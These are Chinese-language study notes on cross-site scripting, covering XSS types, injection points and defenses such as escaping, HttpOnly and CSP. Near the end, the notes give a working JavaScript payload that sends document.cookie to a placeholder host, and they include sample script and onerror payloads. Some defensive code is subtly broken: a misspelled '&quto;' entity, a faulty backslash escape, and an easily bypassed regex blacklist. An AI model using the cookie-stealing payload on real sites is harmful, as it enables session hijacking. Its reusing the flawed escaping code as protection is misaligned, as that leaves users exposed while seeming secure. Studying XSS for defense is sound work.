# XSS

## xss定义
> XSS Cross Site Script 中译是**跨站脚本攻击**；其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。

## xss原理
> XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。

> 攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。


## xss攻击方式
  **反射型** domparse
    定义: 反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。
    发出请求时，出现在 url 中，服务器解析响应后, xss 代码响应内容一起传回给浏览器。最后执行在浏览器
    <iframe src="//baidu.comt.html">
    解决：链接加密
  **存储型**
    定义: 存储型 XSS 会把用户输入的数据 "存储" 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。
    差别: 差别仅在于提交代码仅在于服务器端 数据库 内存 文件
    场景: 攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。
    <script>alert(1)</script>

  **基于DOM**
    定义: 基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

## xss 攻击点
  1、HTML 节点内容
  2、HTML 属性 超出属性本身 <img src="null" onerroe = "alert(1)"> <p onclick="alert('aaa')"></p>
  3、JS 代码
  4、富文本


## xss防御措施

- X-XSS-Protection
防御的是 反射型，即url参数再次出现在页面中，且出现在HTML内容或者属性中。有限的不能依赖这种手段。
  - ctx.set('X-XSS-Protection', 0) // 关掉
  - ctx.set('X-XSS-Protection', 1) // 打开 默认值
  - ctx.set('X-XSS-Protection', 1, url) // 打开 发送到次url数据

- 1、HTML节点内容：转译
    编码
        entity编码
    过滤
        dom属性 onerror
        style节点，script  iframe节点
    校正   
        编码直接解码entity
        dom parse转化 校正不配对的dom标签
    HttpOnly 最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的Javascript 访问带有 HttpOnly 属性的Cookie。
        通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。
    输入检查
    恶意表单
    HTML：xss转义 < > "" ''  破坏结构
    页面之前必须加以encode
    js:innerHTML转义
    css:expression计算
    输入检查 decodingMap

- 2、HTML属性
  - 转译 HTML 属性
```js
var escapeHTML = function (str) {
  if(!str) return ''
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  return str
}
```
- JS 代码
```js
var escapeForJS = function (str) {
  if(!str) return ''
  str = str.replace(/\\/g, '\\\\"')
  str = str.replace(/"/g, '\\"')
  return str
}
// 或者JSON.stringify(str)
```

- 富文本

富文本：
    黑名单过滤，指定标签，正则表达过滤；
    白名单保留部分标签和属性，只允许指定标签麻烦数据结构组装，
```js
// 黑名单
var xssFilter = function (html) {
  if(!html) return ''
  html = html.replace(/<\s*\/?script\s*>/g , '')
  html = html.replace(/javascript:[^'"]*/g , '')
  html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/g , '')
  return html
}
// 白名单
// dom 遍历元素 cheerio
whiteList()
```

## CSP  Content Security Policy
- 内容安全策略
- 用于指定哪些内容可以执行
```js
ctx.set(`Content-Security-Policy`,`default-src 'self'`) //同域
```

## 案例

1、站酷搜索
```js
var img = document.createElement('img')
img.width = 0
img.height = 0
img.src = 'http://your.host.com/test.php?cookie='+encodeURIComponent(document.cookie)
```